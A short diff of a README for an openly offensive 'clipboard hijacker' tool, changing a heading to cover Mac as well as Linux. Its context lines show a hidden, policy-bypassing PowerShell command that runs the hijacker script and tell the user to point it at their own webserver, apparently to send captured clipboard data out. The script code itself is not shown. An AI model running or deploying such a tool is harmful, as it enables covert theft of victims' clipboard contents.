@@ -25,7 +25,7 @@ change your webserver's IP address in clipboardhijacker.ps1 file & run this scri
 
 ## 1. For Windows
 #### powershell -NoP -NonI -W h -Exec Bypass .\clipBoardHijacker.ps1
-## 2. For Linux
+## 2. For Linux or Mac
 ###   Dependencies: The Bash script requires xclip, curl, and jq, which are easily installed on most Linux distributions. On macOS, you can replace xclip with pbpaste and adjust the script accordingly.
    
 #### chmod +x clipBoardHijacker.sh
